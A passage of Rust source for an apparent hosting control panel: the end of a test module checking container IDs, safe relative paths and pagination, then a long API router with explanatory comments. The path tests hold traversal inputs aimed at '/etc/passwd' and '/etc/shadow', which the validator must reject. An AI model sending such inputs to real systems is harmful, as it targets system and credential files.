        assert!(!is_valid_container_id("GHIJKL")); // G-Z are not hex
        assert!(!is_valid_container_id(&"a".repeat(65))); // too long
    }

    // ── Path traversal ──────────────────────────────────────────────────

    #[test]
    fn safe_paths() {
        assert!(is_safe_relative_path("index.html"));
        assert!(is_safe_relative_path("css/style.css"));
        assert!(is_safe_relative_path("wp-content/uploads/image.png"));
        assert!(is_safe_relative_path(".htaccess"));
        assert!(is_safe_relative_path("."));
    }

    #[test]
    fn unsafe_paths() {
        assert!(!is_safe_relative_path(""));
        assert!(!is_safe_relative_path("../etc/passwd"));
        assert!(!is_safe_relative_path("foo/../../etc/shadow"));
        assert!(!is_safe_relative_path("/etc/passwd")); // absolute
        assert!(!is_safe_relative_path("file\0.txt")); // null byte
    }

    // ── Pagination ──────────────────────────────────────────────────────

    #[test]
    fn paginate_defaults() {
        let (limit, offset) = crate::error::paginate(None, None);
        assert_eq!(limit, 100);
        assert_eq!(offset, 0);
    }

    #[test]
    fn paginate_custom() {
        let (limit, offset) = crate::error::paginate(Some(50), Some(10));
        assert_eq!(limit, 50);
        assert_eq!(offset, 10);
    }

    #[test]
    fn paginate_clamps() {
        let (limit, _) = crate::error::paginate(Some(500), None);
        assert_eq!(limit, 200); // max
        let (limit, _) = crate::error::paginate(Some(0), None);
        assert_eq!(limit, 1); // min
    }
}

pub fn router() -> Router<AppState> {
    Router::new()
        // Auth
        .route("/api/auth/setup-status", get(auth::setup_status))
        .route("/api/auth/setup", post(auth::setup))
        .route("/api/auth/login", post(auth::login))
        .route("/api/auth/logout", post(auth::logout))
        .route("/api/auth/me", get(auth::me))
        .route("/api/auth/register", post(auth::register))
        .route("/api/auth/verify-email", post(auth::verify_email))
        .route("/api/auth/forgot-password", post(auth::forgot_password))
        .route("/api/auth/reset-password", post(auth::reset_password))
        .route("/api/auth/change-password", post(auth::change_password))
        .route("/api/auth/revoke-all", post(auth::revoke_all_sessions))
        // Session management
        .route("/api/auth/sessions", get(auth::list_sessions))
        .route("/api/auth/sessions/{id}", delete(auth::revoke_session))
        // GDPR data export
        .route("/api/auth/export-my-data", get(auth::export_my_data))
        // Two-Factor Authentication
        .route("/api/auth/2fa/setup", post(auth::twofa_setup))
        .route("/api/auth/2fa/enable", post(auth::twofa_enable))
        .route("/api/auth/2fa/verify", post(auth::twofa_verify))
        .route("/api/auth/2fa/disable", post(auth::twofa_disable))
        .route("/api/auth/2fa/recovery-codes", post(auth::twofa_regenerate_recovery_codes))
        .route("/api/auth/2fa/status", get(auth::twofa_status))
        // Passkeys / WebAuthn
        .route("/api/auth/passkey/register/begin", post(passkeys::register_begin))
        .route("/api/auth/passkey/register/complete", post(passkeys::register_complete))
        .route("/api/auth/passkey/auth/begin", post(passkeys::auth_begin))
        .route("/api/auth/passkey/auth/complete", post(passkeys::auth_complete))
        .route("/api/auth/passkeys", get(passkeys::list_passkeys))
        .route("/api/auth/passkeys/{id}", delete(passkeys::delete_passkey).put(passkeys::rename_passkey))
        // Container isolation policies (admin)
        .route("/api/container-policies", get(docker_apps::list_policies).post(docker_apps::create_policy))
        .route("/api/container-policies/{user_id}", get(docker_apps::get_policy).put(docker_apps::update_policy).delete(docker_apps::delete_policy))
        .route("/api/container-policies/{user_id}/usage", get(docker_apps::policy_usage))
        // Users (admin)
        .route("/api/users", get(users::list).post(users::create))
        .route("/api/users/{id}", put(users::update).delete(users::remove))
        .route("/api/users/{id}/toggle-suspend", post(users::toggle_suspend))
        .route("/api/users/{id}/reset-password", post(users::reset_password))
        .route("/api/users/{id}/reset-2fa", post(users::reset_2fa))
        // Sites
        .route("/api/sites", get(sites::list).post(sites::create))
        // Read-only, admin-only, and the ONLY site read that looks past
        // `user_id`. It is what makes `POST /api/sites/{id}/transfer` reversible
        // — without it an admin who hands a site to a client cannot see the row
        // again, and the Transfer control lives on a page that then 404s them.
        .route("/api/admin/sites", get(sites::list_for_admin))
        .route("/api/sites/{id}", get(sites::get_one).delete(sites::remove))
        .route("/api/sites/{id}/provision-log", get(sites::provision_log))
        .route("/api/sites/{id}/php", put(sites::switch_php))
        .route("/api/sites/{id}/runtime", put(sites::switch_runtime))
        .route("/api/sites/{id}/limits", put(sites::update_limits))
        .route("/api/sites/{id}/domain", put(sites::rename_domain))
        .route("/api/sites/{id}/transfer", post(sites::transfer))
        .route("/api/sites/{id}/toggle", put(sites::toggle_enabled))
        .route("/api/sites/{id}/fastcgi-cache", put(sites::toggle_fastcgi_cache))
        .route("/api/sites/{id}/fastcgi-cache/purge", post(sites::purge_fastcgi_cache))
        .route("/api/sites/{id}/redis-cache", put(sites::toggle_redis_cache))
        .route("/api/sites/{id}/redis-cache/purge", post(sites::purge_redis_cache))
        .route("/api/sites/{id}/waf", put(sites::toggle_waf))
        .route("/api/sites/{id}/waf/logs", get(sites::waf_logs))
        .route("/api/sites/{id}/optimize-images", post(sites::optimize_images))
        .route("/api/sites/{id}/security-headers", put(sites::update_security_headers))
        .route("/api/sites/{id}/bot-protection", put(sites::toggle_bot_protection))
        // PHP versions
        .route("/api/php/versions", get(sites::php_versions))
        .route("/api/php/install", post(sites::php_install))
        .route("/api/php/uninstall", post(sites::php_uninstall))
        // SSL
        .route("/api/sites/{id}/ssl", post(ssl::provision).get(ssl::status))
        .route("/api/sites/{id}/ssl/dns01", post(ssl::provision_dns01))
        .route("/api/ssl/{id}/renew", post(ssl::renew))
        .route("/api/ssl/{id}", delete(ssl::revoke))
        .route("/api/ssl/profiles", get(ssl::profiles))
        .route("/api/preflight/dns", get(ssl::preflight_dns))
        .route("/api/sites/{id}/preflight", get(ssl::preflight_site))
        .route("/api/ssl/default-profile", post(ssl::set_default_profile))
        .route(
            "/api/ssl/contact-email",
            get(ssl::get_contact_email).post(ssl::set_contact_email),
        )
        // File Manager
        .route("/api/sites/{id}/files", get(files::list_dir).delete(files::delete_entry))
        .route("/api/sites/{id}/files/read", get(files::read_file))
        .route("/api/sites/{id}/files/download", get(files::download_file))
        .route("/api/sites/{id}/files/write", put(files::write_file))
        .route("/api/sites/{id}/files/upload", post(files::upload_file))
        .route("/api/sites/{id}/files/create", post(files::create_entry))
        .route("/api/sites/{id}/files/rename", post(files::rename_entry))
        // Backups
        .route("/api/sites/{id}/backups", get(backups::list).post(backups::create))
        .route("/api/sites/{id}/backups/{backup_id}/restore", post(backups::restore))
        .route("/api/sites/{id}/backups/{backup_id}", delete(backups::remove))
        .route("/api/sites/{id}/restic/backup", post(backups::restic_backup))
        .route("/api/sites/{id}/restic/snapshots", get(backups::restic_snapshots))
        .route("/api/sites/{id}/restic/restore/{snapshot_id}", post(backups::restic_restore))
        // Backup Destinations (admin)
        .route("/api/backup-destinations", get(backup_destinations::list).post(backup_destinations::create))
        .route("/api/backup-destinations/selectable", get(backup_destinations::selectable))
        .route("/api/backup-destinations/{id}", put(backup_destinations::update).delete(backup_destinations::remove))
        .route("/api/backup-destinations/{id}/test", post(backup_destinations::test_connection))
        // Backup Schedules
        .route("/api/sites/{id}/backup-schedule", get(backup_schedules::get_schedule).put(backup_schedules::set_schedule).delete(backup_schedules::remove_schedule))
        .route("/api/backup-setup-status", get(backup_schedules::setup_status))
        // Crons
        .route("/api/sites/{id}/crons", get(crons::list).post(crons::create))
        .route("/api/sites/{id}/crons/{cron_id}", put(crons::update).delete(crons::remove))
        .route("/api/sites/{id}/crons/{cron_id}/run", post(crons::run_now))
        // Site Logs
        .route("/api/sites/{id}/logs", get(logs::site_logs))
        .route("/api/sites/{id}/logs/search", get(logs::search_site_logs))
        // Terminal
        .route("/api/terminal/token", get(terminal::ws_token))
        .route("/api/terminal/share", post(terminal::share_output))
        .route("/api/terminal/shares", get(terminal::list_shares))
        .route("/api/terminal/share/{id}", delete(terminal::revoke_share))
        // Databases
        .route("/api/databases", get(databases::list).post(databases::create))
        .route("/api/databases/{id}", delete(databases::remove))
        .route("/api/databases/{id}/credentials", get(databases::credentials))
        .route("/api/databases/{id}/tables", get(databases::tables))
        .route("/api/databases/{id}/tables/{table}", get(databases::table_schema))
        .route("/api/databases/{id}/indexes/{table}", get(databases::table_indexes))
        .route("/api/databases/{id}/foreign-keys", get(databases::foreign_keys))
        .route("/api/databases/{id}/schema-overview", get(databases::schema_overview))
        .route("/api/databases/{id}/query", post(databases::query))
        .route("/api/databases/{id}/pitr", get(databases::pitr_config).put(databases::update_pitr_config))
        .route("/api/databases/{id}/pitr/restore", post(databases::pitr_restore))
        .route("/api/databases/{id}/reset-password", post(databases::reset_password))
        .route("/api/databases/{id}/dumps", get(databases::dumps))
        .route("/api/databases/{id}/import", post(databases::import))
        // Compose Stacks
        .route("/api/stacks", get(stacks::list).post(stacks::create))
        .route("/api/stacks/{id}", get(stacks::get_one).put(stacks::update).delete(stacks::remove))
        .route("/api/stacks/{id}/start", post(stacks::start))
        .route("/api/stacks/{id}/stop", post(stacks::stop))
        .route("/api/stacks/{id}/restart", post(stacks::restart))
        // The Certificates page's control for a stack's certificate. A stack has
        // no `sites` row, so the site-shaped renew route could never address one.
        .route("/api/stacks/{id}/renew-ssl", post(stacks::renew_ssl))
        // TLS certificate registry — named certificates a stack claims by alias (#104)
        .route("/api/tls-certificates", get(tls_certificates::list).post(tls_certificates::create))
        .route("/api/tls-certificates/{id}", put(tls_certificates::replace).delete(tls_certificates::remove))
        // Docker Apps (admin)
        .route("/api/apps/updates", get(docker_apps::check_updates))
        .route("/api/apps/gpu-info", get(docker_apps::gpu_info))
        .route("/api/apps/templates", get(docker_apps::list_templates))
        .route("/api/apps/preflight", get(docker_apps::preflight))
        .route("/api/apps/deploy", post(docker_apps::deploy))
        .route("/api/apps/deploy/{deploy_id}/log", get(docker_apps::deploy_log))
        .route("/api/apps/compose/validate", post(docker_apps::compose_validate))
        .route("/api/apps/compose/parse", post(docker_apps::compose_parse))
        .route("/api/apps/compose/deploy", post(docker_apps::compose_deploy))
        .route("/api/apps/registries", get(docker_apps::list_registries))
        .route("/api/apps/registry-login", post(docker_apps::registry_login))
        .route("/api/apps/registry-logout", post(docker_apps::registry_logout))
        .route("/api/apps/images", get(docker_apps::list_images))
        .route("/api/apps/images/prune", post(docker_apps::prune_images))
        .route("/api/apps/images/{id}", delete(docker_apps::remove_image))
        .route("/api/apps", get(docker_apps::list_apps))
        .route("/api/apps/{container_id}", delete(docker_apps::remove_app))
        .route("/api/apps/{container_id}/stop", post(docker_apps::stop_app))
        .route("/api/apps/{container_id}/start", post(docker_apps::start_app))
        .route("/api/apps/{container_id}/restart", post(docker_apps::restart_app))
        .route("/api/apps/{container_id}/logs", get(docker_apps::app_logs))
        .route("/api/apps/{container_id}/env", get(docker_apps::app_env).put(docker_apps::update_env))
        .route("/api/apps/{container_id}/update", post(docker_apps::update_app))
        .route("/api/apps/{container_id}/stats", get(docker_apps::container_stats))
        .route("/api/apps/{container_id}/shell-info", get(docker_apps::shell_info))
        .route("/api/apps/{container_id}/exec", post(docker_apps::exec_command))
        .route("/api/apps/{container_id}/ollama/models", get(docker_apps::ollama_list_models))
        .route("/api/apps/{container_id}/ollama/pull", post(docker_apps::ollama_pull_model))
        .route("/api/apps/{container_id}/ollama/delete", post(docker_apps::ollama_delete_model))
        .route("/api/apps/{container_id}/volumes", get(docker_apps::container_volumes))
        .route("/api/apps/{container_id}/snapshot", post(docker_apps::snapshot_container))
        .route("/api/apps/{container_id}/image", put(docker_apps::update_image))
        .route("/api/apps/{container_id}/limits", put(docker_apps::update_limits))
        // Container auto-sleep
        .route("/api/apps/sleep-status", get(docker_apps::sleep_status_list))
        .route("/api/apps/{container_id}/sleep-config", get(docker_apps::get_sleep_config).put(docker_apps::update_sleep_config))
        .route("/api/apps/{container_id}/wake", post(docker_apps::wake_container))
        .route("/api/apps/{container_id}/sleep", post(docker_apps::sleep_container))
        .route("/api/apps/{container_id}/activity-ping", post(docker_apps::activity_ping))
        // Git Deploy
        .route("/api/git-deploys", get(git_deploys::list).post(git_deploys::create))
        .route("/api/git-deploys/{id}", get(git_deploys::get_one).put(git_deploys::update).delete(git_deploys::remove))
        .route("/api/git-deploys/{id}/deploy", post(git_deploys::deploy))
        .route("/api/git-deploys/{id}/rollback/{history_id}", post(git_deploys::rollback))
        .route("/api/git-deploys/{id}/history", get(git_deploys::history))
        .route("/api/git-deploys/{id}/keygen", post(git_deploys::keygen))
        .route("/api/git-deploys/{id}/stop", post(git_deploys::stop))
        .route("/api/git-deploys/{id}/start", post(git_deploys::start))
        .route("/api/git-deploys/{id}/restart", post(git_deploys::restart))
        .route("/api/git-deploys/{id}/logs", get(git_deploys::container_logs))
        .route("/api/git-deploys/{id}/previews", get(git_deploys::list_previews))
        .route("/api/git-deploys/{id}/previews/{preview_id}", delete(git_deploys::delete_preview))
        .route("/api/git-deploys/{id}/schedule", post(git_deploys::schedule_deploy).delete(git_deploys::cancel_scheduled_deploy))
        .route("/api/git-deploys/deploy/{deploy_id}/log", get(git_deploys::deploy_log))
        .route("/api/webhooks/git/{id}/{secret}", post(git_deploys::webhook))
        // Deploy Approvals
        .route("/api/deploy-approvals", get(git_deploys::list_approvals))
        .route("/api/deploy-approvals/{id}/approve", post(git_deploys::approve_deploy))
        .route("/api/deploy-approvals/{id}/reject", post(git_deploys::reject_deploy))
        // Security (admin)
        .route("/api/security/overview", get(security::overview))
        .route("/api/security/firewall", get(security::firewall_status))
        .route("/api/security/firewall/rules", post(security::add_firewall_rule))
        .route("/api/security/firewall/rules/{number}", delete(security::delete_firewall_rule))
        .route("/api/security/fail2ban", get(security::fail2ban_status))
        // SSH Hardening
        .route("/api/security/ssh/disable-password", post(security::ssh_disable_password))
        .route("/api/security/ssh/enable-password", post(security::ssh_enable_password))
        .route("/api/security/ssh/disable-root", post(security::ssh_disable_root))
        .route("/api/security/ssh/change-port", post(security::ssh_change_port))
        // Fail2Ban Management
        .route("/api/security/fail2ban/unban", post(security::fail2ban_unban_ip))
        .route("/api/security/fail2ban/ban", post(security::fail2ban_ban_ip))
        .route("/api/security/fail2ban/{jail}/banned", get(security::fail2ban_banned))
        // Security Fix
        .route("/api/security/fix", post(security::apply_security_fix))
        // Login Audit
        .route("/api/security/login-audit", get(security::login_audit))
        // Panel Fail2Ban Jail
        .route("/api/security/panel-jail/setup", post(security::setup_panel_jail))
        .route("/api/security/panel-jail/status", get(security::panel_jail_status))
        .route("/api/security/canary-status", get(security::canary_status))
        .route("/api/security/canary/arm", post(security::canary_arm))
        // Security Compliance Report
        .route("/api/security/report", get(security::compliance_report))
        // Security Hardening (post-incident features)
        .route("/api/security/lockdown", get(security::lockdown_status))
        .route("/api/security/lockdown/activate", post(security::lockdown_activate))
        .route("/api/security/lockdown/deactivate", post(security::lockdown_deactivate))
        .route("/api/security/panic", post(security::panic_button))
        .route("/api/security/forensic-snapshot", post(security::forensic_snapshot))
        .route("/api/security/audit-log", get(security::audit_log_list))
        .route("/api/security/recordings", get(security::recordings_list))
        .route("/api/security/pending-users", get(security::pending_users))
        .route("/api/security/users/{id}/approve", post(security::approve_user))
        .route("/api/security/unverified-users", get(security::unverified_users))
        .route("/api/security/users/{id}/verify-email", post(security::verify_user_email))
        // Security Scanning
        .route("/api/security/scan", post(security_scans::trigger_scan))
        .route("/api/security/scans", get(security_scans::list_scans))
        .route("/api/security/scans/{id}", get(security_scans::get_scan))
        .route("/api/security/posture", get(security_scans::posture))
        // Image vulnerability scanning (per-image, distinct from full security scans)
        .route("/api/image-scan/settings", get(image_scans::get_settings).put(image_scans::update_settings))
        .route("/api/image-scan/install", post(image_scans::install_scanner))
        .route("/api/image-scan/uninstall", post(image_scans::uninstall_scanner))
        .route("/api/image-scan/scan", post(image_scans::scan_image))
        .route("/api/image-scan/recent", get(image_scans::list_recent))
        .route("/api/apps/{name}/scan", get(image_scans::get_app_scan).post(image_scans::scan_app))
        // SBOMs (composition; companion to image-scan vulnerability data)
        .route("/api/sbom/settings", get(sboms::get_settings))
        .route("/api/sbom/install", post(sboms::install_scanner))
        .route("/api/sbom/uninstall", post(sboms::uninstall_scanner))
        .route("/api/sbom/generate", post(sboms::generate))
        // Wildcard, not a single segment: an image reference contains slashes
        // (`ghcr.io/org/app:v1`), so `{image}` matched only the bare
        // `name:tag` shape and 404'd for every registry-qualified image — which
        // is most of the catalogue.
        .route("/api/sbom/image/{*image}", get(sboms::get_image_sbom))
        .route("/api/apps/{name}/sbom", get(sboms::download_app_sbom).post(sboms::generate_app))
        // System
        .route("/api/health", get(system::health))
        .route("/api/system/info", get(system::info))
        .route("/api/system/processes", get(logs::processes))
        .route("/api/system/network", get(logs::network))
        // System Updates
        .route("/api/system/updates", get(system::updates_list))
        .route("/api/system/updates/apply", post(system::updates_apply))
        .route("/api/system/updates/count", get(system::updates_count))
        .route("/api/system/reboot", post(system::system_reboot))
        .route("/api/system/disk-io", get(system::disk_io))
        .route("/api/system/cleanup", post(system::disk_cleanup))
        .route("/api/system/hostname", post(system::change_hostname))
        // Logs (admin)
        .route("/api/logs", get(logs::system_logs))
        .route("/api/logs/search", get(logs::search_system_logs))
        .route("/api/logs/stream/token", get(logs::stream_token))
        .route("/api/logs/stats", get(logs::log_stats))
        .route("/api/logs/docker", get(logs::docker_log_containers))
        .route("/api/logs/docker/{container}", get(logs::docker_log_view))
        .route("/api/logs/service/{service}", get(logs::service_logs))
        .route("/api/logs/sizes", get(logs::log_sizes))
        .route("/api/logs/truncate", post(logs::truncate_log))
        .route("/api/logs/check-errors", post(logs::check_errors))
        // Settings (admin)
        .route("/api/settings", get(settings::list).put(settings::update))
        .route("/api/settings/export", get(settings::export_config))
        .route("/api/settings/import", post(settings::import_config))
        .route("/api/settings/recording-coverage", get(settings::recording_coverage))
        .route("/api/settings/smtp/test", post(settings::test_email))
        .route("/api/settings/test-webhook", post(settings::test_webhook))
        .route("/api/settings/health", get(settings::health))
        .route(
            "/api/settings/credentials/reencrypt",
            post(settings::reencrypt_credentials),
        )
        .route("/api/settings/oauth-redirects", get(oauth::redirect_uris))
        // DNS Management
        // CDN Integration (BunnyCDN + Cloudflare CDN)
        .route("/api/cdn/zones", get(cdn::list_zones).post(cdn::create_zone))
        .route("/api/cdn/zones/{id}", put(cdn::update_zone).delete(cdn::delete_zone))
        .route("/api/cdn/zones/{id}/purge", post(cdn::purge_cache))
        .route("/api/cdn/zones/{id}/stats", get(cdn::zone_stats))
        .route("/api/cdn/zones/{id}/test", post(cdn::test_credentials))
        .route("/api/cdn/zones/{id}/pull-zones", get(cdn::list_pull_zones))
        // DNS Management
        .route("/api/dns/zones", get(dns::list_zones).post(dns::create_zone))
        .route("/api/dns/zones/{id}", delete(dns::delete_zone))
        .route("/api/dns/zones/{id}/records", get(dns::list_records).post(dns::create_record))
        .route("/api/dns/zones/{id}/records/{record_id}", put(dns::update_record).delete(dns::delete_record))
        .route("/api/dns/propagation", post(dns::check_propagation))
        .route("/api/dns/health-check", post(dns::dns_health_check))
        .route("/api/dns/zones/{id}/dnssec", get(dns::dnssec_status))
        .route("/api/dns/zones/{id}/changelog", get(dns::dns_changelog))
        .route("/api/dns/zones/{id}/analytics", get(dns::dns_analytics))
        .route("/api/dns/zones/{id}/cf/settings", get(dns::cf_zone_settings).put(dns::cf_update_setting))
        .route("/api/dns/zones/{id}/cf/cache/purge", post(dns::cf_purge_cache))
        .route("/api/tunnel/configure", post(dns::configure_tunnel))
        .route("/api/tunnel/status", get(dns::tunnel_status))
        // WordPress Toolkit
        .route("/api/wordpress/sites", get(wordpress::all_wp_sites))
        .route("/api/wordpress/bulk-update", post(wordpress::bulk_update))
        .route("/api/sites/{id}/wordpress/vuln-scan", post(wordpress::vuln_scan))
        .route("/api/sites/{id}/wordpress/security-check", get(wordpress::security_check))
        .route("/api/sites/{id}/wordpress/harden", post(wordpress::wp_harden))
        // WordPress Management
        .route("/api/sites/{id}/wordpress", get(wordpress::info))
        .route("/api/sites/{id}/wordpress/install", post(wordpress::install))
        .route("/api/sites/{id}/wordpress/plugins", get(wordpress::plugins))
        .route("/api/sites/{id}/wordpress/themes", get(wordpress::themes))
        .route("/api/sites/{id}/wordpress/update/{target}", post(wordpress::update))
        .route("/api/sites/{id}/wordpress/plugin/{action}", post(wordpress::plugin_action))
        .route("/api/sites/{id}/wordpress/theme/{action}", post(wordpress::theme_action))
        .route("/api/sites/{id}/wordpress/auto-update", post(wordpress::set_auto_update))
        .route("/api/sites/{id}/wordpress/update-safe", post(wordpress::update_safe))
        // Git Deploy
        .route("/api/sites/{id}/deploy", get(deploy::get_config).put(deploy::set_config).delete(deploy::remove_config))
        .route("/api/sites/{id}/deploy/trigger", post(deploy::trigger))
        .route("/api/sites/{id}/deploy/keygen", post(deploy::keygen))
        .route("/api/sites/{id}/deploy/logs", get(deploy::logs))
        .route("/api/sites/{id}/deploy/releases", get(deploy::list_releases))
        .route("/api/sites/{id}/deploy/rollback/{release_id}", post(deploy::rollback_release))
        // Uptime Monitors
        .route("/api/monitors", get(monitors::list).post(monitors::create))
        .route("/api/monitors/certificates", get(monitors::certificate_dashboard))
        .route("/api/admin/certificates", get(monitors::certificate_dashboard_for_admin))
        .route("/api/monitors/maintenance", get(monitors::list_maintenance).post(monitors::create_maintenance))
        .route("/api/monitors/maintenance/{id}", delete(monitors::delete_maintenance))
        .route("/api/monitors/{id}", put(monitors::update).delete(monitors::remove))
        .route("/api/monitors/{id}/checks", get(monitors::checks))
        .route("/api/monitors/{id}/incidents", get(monitors::incidents))
        .route("/api/monitors/{id}/uptime", get(monitors::uptime_stats))
        .route("/api/monitors/{id}/chart", get(monitors::response_chart))
        .route("/api/monitors/{id}/check", post(monitors::force_check))
        // Billing
        .route("/api/billing/plan", get(billing::current_plan))
        .route("/api/billing/checkout", post(billing::create_checkout))
        .route("/api/billing/portal", post(billing::customer_portal))
        // Branding logo upload (admin)
        .route("/api/branding/logo", post(branding_assets::upload_logo))
        // Public endpoints (no auth)
        .route("/api/branding", get(settings::branding))
        .route("/api/branding/logo/{filename}", get(branding_assets::get_logo))
        .route("/api/auth/oauth/{provider}", get(oauth::authorize))
        .route("/api/auth/oauth/{provider}/callback", get(oauth::callback))
        .route("/api/status-page", get(monitors::status_page))
        .route("/api/status-page/public", get(incidents::public_status_page))
        .route("/api/webhooks/gateway/{token}", post(webhook_gateway::receive_webhook))
        .route("/api/status-page/subscribe", post(incidents::subscribe))
        // Both methods on purpose. The handler's own doc comment, the guide's
        // prose and the guide's API table have all published DELETE since this
        // shipped, while the route accepted POST only — so every reader who
        // followed the documentation got a 405, and the one method that worked
        // was named on no published surface. POST stays because the repo's own
        // e2e calls it and removing it would break a working caller.
        .route(
            "/api/status-page/unsubscribe",
            post(incidents::unsubscribe).delete(incidents::unsubscribe),
        )
        .route("/api/terminal/shared/{id}", get(terminal::view_shared))
        // Heartbeat endpoint (no auth — monitor validates by ID)
        .route("/api/heartbeat/{monitor_id}/{token}", post(monitors::heartbeat))
        // Webhooks (no auth — validated by secret/signature)
        .route("/api/webhooks/stripe", post(billing::webhook))
        .route("/api/webhooks/deploy/{site_id}/{secret}", post(deploy::webhook))
        // Staging Environments
        .route("/api/sites/{id}/staging", get(staging::get_staging).post(staging::create).delete(staging::destroy))
        .route("/api/sites/{id}/staging/sync", post(staging::sync_to_staging))
        .route("/api/sites/{id}/staging/push", post(staging::push_to_prod))
        // Redirect Rules
        .route("/api/sites/{id}/redirects", get(sites::list_redirects).post(sites::add_redirect))
        .route("/api/sites/{id}/redirects/remove", post(sites::remove_redirect))
        // Password Protection
        .route("/api/sites/{id}/password-protect", get(sites::list_protected).post(sites::add_password_protect))
        .route("/api/sites/{id}/password-protect/remove", post(sites::remove_password_protect))
        // Domain Aliases
        .route("/api/sites/{id}/aliases", get(sites::list_aliases).post(sites::add_alias))
        .route("/api/sites/{id}/aliases/remove", post(sites::remove_alias))
        // Access Logs, Traffic Stats, PHP Errors, Health Check
        .route("/api/sites/{id}/access-logs", get(sites::access_logs))
        .route("/api/sites/{id}/stats", get(sites::site_stats))
        .route("/api/sites/{id}/php-errors", get(sites::php_errors))
        .route("/api/sites/{id}/health", get(sites::health_check))
        .route("/api/sites/{id}/health-summary", get(sites::health_summary))
        // Site Cloning
        .route("/api/sites/{id}/clone", post(sites::clone_site))
        // Custom SSL Upload
        .route("/api/sites/{id}/ssl/upload", post(sites::upload_ssl))
        // Environment Variables
        .route("/api/sites/{id}/env", get(sites::get_env_vars).put(sites::set_env_vars))
        // PHP Extensions Manager
        .route("/api/php/extensions/{version}", get(sites::php_extensions))
        .route("/api/php/extensions/install", post(sites::install_php_extension))
        // Agent endpoints — Bearer token from the servers table, never a cookie
        // or a user JWT. This comment used to say exactly that while
        // /api/agent/version demanded `AuthUser`, a credential an agent cannot
        // hold; it 401'd on every request for four releases and the comment is a
        // large part of why nobody looked (s233). So, precisely:
        //   /api/agent/version, /api/agent/commands, /api/agent/commands/result
        //     -> crate::auth::authenticate_agent + agent_rate_limit
        //   /api/agent/checkin
        //     -> its OWN check (agent_checkin.rs): the server_id comes from the
        //        request BODY, the row is fetched by id, and the token is
        //        compared with subtle::ConstantTimeEq. It also keeps its own
        //        inlined rate limiter. A change to the shared helper does NOT
        //        reach it.
        .route("/api/agent/version", get(agent_updates::latest_version))
        .route("/api/agent/checkin", post(agent_checkin::checkin))
        // API Keys
        .route("/api/api-keys", get(api_keys::list).post(api_keys::create))
        .route("/api/api-keys/{id}", delete(api_keys::revoke))
        .route("/api/api-keys/{id}/rotate", post(api_keys::rotate))
        // Extensions
        .route("/api/extensions", get(extensions::list).post(extensions::create))
        .route("/api/extensions/{id}", put(extensions::update).delete(extensions::remove))
        .route("/api/extensions/{id}/test", post(extensions::test_webhook))
        .route("/api/extensions/{id}/rotate-secret", post(extensions::rotate_secret))
        .route("/api/extensions/{id}/events", get(extensions::events))
        // Servers
        .route("/api/servers", get(servers::list).post(servers::create))
        .route("/api/servers/{id}", get(servers::get_one).put(servers::update).delete(servers::remove))
        .route("/api/servers/{id}/test", post(servers::test_connection))
        .route("/api/servers/{id}/rotate-token", post(servers::rotate_token))
        .route("/api/servers/{id}/rotate-cert-pin", post(servers::rotate_cert_pin))
        .route("/api/servers/{id}/uptime", get(servers::uptime))
        .route("/api/servers/{id}/metrics", get(metrics::server_metrics))
        // Teams
        .route("/api/teams", get(teams::list).post(teams::create))
        .route("/api/teams/{id}", delete(teams::remove))
        .route("/api/teams/{id}/invite", post(teams::invite))
        .route("/api/teams/{id}/members/{member_id}", put(teams::update_member).delete(teams::remove_member))
        .route("/api/teams/accept", post(teams::accept_invite))
        // Alerts
        .route("/api/alerts", get(alerts::list))
        .route("/api/alerts/summary", get(alerts::summary))
        .route("/api/alerts/{id}/acknowledge", put(alerts::acknowledge))
        .route("/api/alerts/{id}/resolve", put(alerts::resolve))
        .route("/api/alert-rules", get(alerts::get_rules).put(alerts::update_rules))
        .route("/api/alert-rules/{server_id}", put(alerts::update_server_rules).delete(alerts::delete_server_rules))
        .route("/api/alert-rules/{rule_id}/escalation-policy", put(alerts::attach_escalation_policy))
        // Alert Runbooks (Phase 4 W2)
        .route("/api/alerts/runbooks", get(alerts::list_runbooks_route))
        .route("/api/alerts/runbooks/apply-defaults", post(alerts::apply_defaults))
        .route("/api/alerts/runbooks/{alert_type}", get(alerts::get_runbook_route).put(alerts::put_runbook).delete(alerts::delete_runbook))
        // On-call Schedules (Phase 4 W3)
        .route("/api/on-call/schedules", get(on_call::list_schedules).post(on_call::create_schedule))
        .route("/api/on-call/schedules/{id}", get(on_call::get_schedule).put(on_call::update_schedule).delete(on_call::delete_schedule))
        .route("/api/on-call/whoami", get(on_call::whoami))
        // Escalation Policies (Phase 4 W3)
        .route("/api/escalation-policies", get(escalation_policies::list_policies).post(escalation_policies::create_policy))
        .route("/api/escalation-policies/{id}", get(escalation_policies::get_policy).put(escalation_policies::update_policy).delete(escalation_policies::delete_policy))
        // Phase 4 W4: panel self-update + snapshots + fleet rolling update
        .route("/api/update/status", get(update::get_status))
        .route("/api/update/apply", post(update::apply_update))
        .route("/api/update/manual-check", post(update::manual_check))
        .route("/api/update/rollback", post(update::rollback))
        .route("/api/update/channel", get(update::get_channel).put(update::put_channel))
        .route("/api/snapshots", get(update::list_snapshots_route).post(update::create_snapshot_route))
        .route("/api/snapshots/{id}", delete(update::delete_snapshot_route))
        .route("/api/update/fleet", get(update::list_fleet_runs).post(update::apply_fleet))
        .route("/api/update/fleet/{id}", get(update::get_fleet_run))
        // Phase 4 W5: fleet configuration-drift report (read-only)
        .route("/api/drift/servers", get(drift::servers))
        .route("/api/drift", get(drift::report))
        // Notification Center
        .route("/api/notifications", get(notifications::list))
        .route("/api/notifications/summary", get(notifications::summary))
        .route("/api/notifications/unread-count", get(notifications::unread_count))
        .route("/api/notifications/stream", get(notifications::stream))
        .route("/api/notifications/{id}/read", post(notifications::mark_read))
        .route("/api/notifications/read-all", post(notifications::mark_all_read))
        .route("/api/notifications/read", delete(notifications::delete_read))
        .route("/api/notifications/{id}", delete(notifications::delete_one))
        // Backup Orchestrator
        .route("/api/backup-orchestrator/all", get(backup_orchestrator::list_all_backups))
        .route("/api/backup-orchestrator/health", get(backup_orchestrator::health))
        .route("/api/backup-orchestrator/preflight", get(backup_orchestrator::preflight))
        .route("/api/backup-orchestrator/policies", get(backup_orchestrator::list_policies).post(backup_orchestrator::create_policy))
        .route("/api/backup-orchestrator/policies/protect-all", post(backup_orchestrator::protect_all))
        .route("/api/backup-orchestrator/policies/{id}", put(backup_orchestrator::update_policy).delete(backup_orchestrator::delete_policy))
        .route("/api/backup-orchestrator/db-backup", post(backup_orchestrator::create_db_backup))
        .route("/api/backup-orchestrator/db-backups", get(backup_orchestrator::list_db_backups))
        .route("/api/backup-orchestrator/db-backups/{id}", delete(backup_orchestrator::delete_db_backup))
